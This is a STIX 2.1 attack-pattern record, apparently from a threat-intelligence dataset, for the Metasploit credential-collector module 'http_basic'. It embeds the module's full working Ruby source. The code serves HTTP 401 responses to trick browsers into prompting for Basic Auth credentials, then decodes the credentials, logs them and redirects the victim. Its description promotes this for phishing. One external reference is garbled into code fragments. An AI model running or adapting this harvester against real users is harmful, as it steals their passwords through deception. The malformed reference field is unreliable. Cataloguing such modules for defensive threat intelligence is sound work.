{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49ac240e-da27-4f16-b8e2-efd7878a4a2a",
    "created": "2024-08-14T16:22:00.820179Z",
    "modified": "2024-08-14T16:22:00.820182Z",
    "name": "HTTP Client Basic Authentication Credential Collector",
    "description": " This module responds to all requests for resources with a HTTP 401.  This should cause most browsers to prompt for a credential.  If the user enters Basic Auth creds they are sent to the console.  This may be helpful in some phishing expeditions where it is possible to embed a resource into a page.  This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/http_basic.rb",
            "external_id": "http_basic.rb"
        },
        {
            "source_name": "send_redirect(cli",
            "external_id": "datastoreRedirectURL)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'HTTP Client Basic Authentication Credential Collector',\n      'Description'    => %q{\n        This module responds to all requests for resources with a HTTP 401.  This should\n        cause most browsers to prompt for a credential.  If the user enters Basic Auth creds\n        they are sent to the console.\n\n        This may be helpful in some phishing expeditions where it is possible to embed a\n        resource into a page.\n\n        This attack is discussed in Chapter 3 of The Tangled Web by Michal Zalewski.\n      },\n      'Author'      => ['saint patrick <saintpatrick[at]l1pht.com>'],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Capture', 'Description' => 'Run capture web server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Capture'\n        ],\n      'DefaultAction'  => 'Capture'\n    ))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 80 ]),\n        OptString.new('REALM', [ true, \"The authentication realm you'd like to present.\", \"Secure Site\" ]),\n        OptString.new('RedirectURL', [ false, \"The page to redirect users to after they enter basic auth creds\" ])\n      ])\n  end\n\n  # Not compatible today\n  def support_ipv6?\n    false\n  end\n\n  def run\n    @myhost   = datastore['SRVHOST']\n    @myport   = datastore['SRVPORT']\n    @realm    = datastore['REALM']\n\n    exploit\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_request_uri(cli, req)\n    if(req['Authorization'] and req['Authorization'] =~ /basic/i)\n      basic,auth = req['Authorization'].split(/\\s+/)\n      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)\n\n      report_cred(\n        ip: cli.peerhost,\n        port: datastore['SRVPORT'],\n        service_name: 'HTTP',\n        user: user,\n        password: pass,\n        proof: req['Authorization']\n      )\n\n      print_good(\"HTTP Basic Auth LOGIN #{cli.peerhost} \\\"#{user}:#{pass}\\\" / #{req.resource}\")\n      if datastore['RedirectURL']\n        print_status(\"Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}\")\n        send_redirect(cli, datastore['RedirectURL'])\n      else\n        send_not_found(cli)\n      end\n    else\n      print_status(\"Sending 401 to client #{cli.peerhost}\")\n      response = create_response(401, \"Unauthorized\")\n      response.headers['WWW-Authenticate'] = \"Basic realm=\\\"#{@realm}\\\"\"\n      cli.send_response(response)\n    end\n  end\nend\n"
}